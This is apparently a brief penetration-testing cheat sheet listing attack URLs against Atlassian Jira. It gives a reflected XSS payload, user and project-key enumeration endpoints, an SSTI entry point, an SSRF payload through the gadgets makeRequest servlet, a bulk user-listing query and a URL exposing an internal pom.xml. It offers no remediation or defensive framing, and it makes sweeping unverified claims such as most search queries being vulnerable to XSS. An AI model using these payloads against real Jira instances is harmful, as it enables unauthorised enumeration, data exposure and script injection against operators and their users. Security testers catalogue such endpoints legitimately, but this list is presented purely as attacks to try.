jira softwares => THey are built by atlassian and they have a number of Public CVE's including SSRF, XSS and Sensitive data exposure !


#Common vulnerabilities
##They are :

XSS :
<JIRA_URL>/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search

USER ENUMERATION :
/secure/ViewUserHover.jspa?username=<uname>

PROJECT KEY ENUMERATION :
/browse.<project_key> => CAN check if project keys are valid or not
Unauth entry is also possible

XSS :
/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
Almost all the search queries are vulnerable to XSS.

SSTI :
/secure/ContactAdministrators!default.jspa

SSRF :
/plugins/servlet/gadgets/makeRequest?url=https://<host_name>:1337@example.com

SPECIFIC USER INNFO ENUM :
/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true

USER ENUM :
rest/api/2/user/picker?query=<user_name_here> 
Says if a user is valid or not

SENSITIVE ENUM :
/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
